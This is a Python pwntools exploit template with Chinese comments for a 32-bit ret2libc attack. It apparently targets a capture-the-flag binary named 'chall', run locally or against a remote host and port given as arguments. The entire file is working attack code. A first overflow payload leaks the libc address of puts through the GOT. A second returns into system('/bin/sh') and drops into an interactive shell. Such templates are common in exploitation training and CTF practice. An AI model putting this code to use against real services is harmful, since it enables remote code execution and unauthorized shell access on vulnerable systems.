#!/usr/bin/env python3
"""ret2libc 通用模板（32 位示例，64 位需改用寄存器传参 + pop rdi gadget）

用法:
    python ret2libc_template.py <libc路径> [远程host] [远程端口]
"""
import sys
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

libc_path = sys.argv[1] if len(sys.argv) > 1 else './libc.so.6'
if len(sys.argv) >= 4:
    io = remote(sys.argv[2], int(sys.argv[3]))
else:
    io = process('./chall')

elf = ELF('./chall', checksec=False)
libc = ELF(libc_path, checksec=False)

OFFSET = 112  # 用 cyclic 确定后修改

# ---------- 第一阶段: 泄漏 puts 真实地址 ----------
payload1 = flat(
    b'a' * OFFSET,
    elf.plt['puts'],
    elf.symbols['main'],      # 返回 main 准备第二次溢出
    elf.got['puts'],
)
io.sendlineafter(b'>', payload1)
leak = u32(io.recv(4))
log.success(f'puts@libc = {hex(leak)}')

libc.address = leak - libc.symbols['puts']
system, binsh = libc.symbols['system'], next(libc.search(b'/bin/sh\x00'))
log.success(f'system = {hex(system)}  /bin/sh = {hex(binsh)}')

# ---------- 第二阶段: 返回 system("/bin/sh") ----------
payload2 = flat(
    b'a' * OFFSET,
    libc.symbols['system'],
    0xdeadc0de,               # system 的返回地址占位
    binsh,
)
io.sendlineafter(b'>', payload2)
io.interactive()
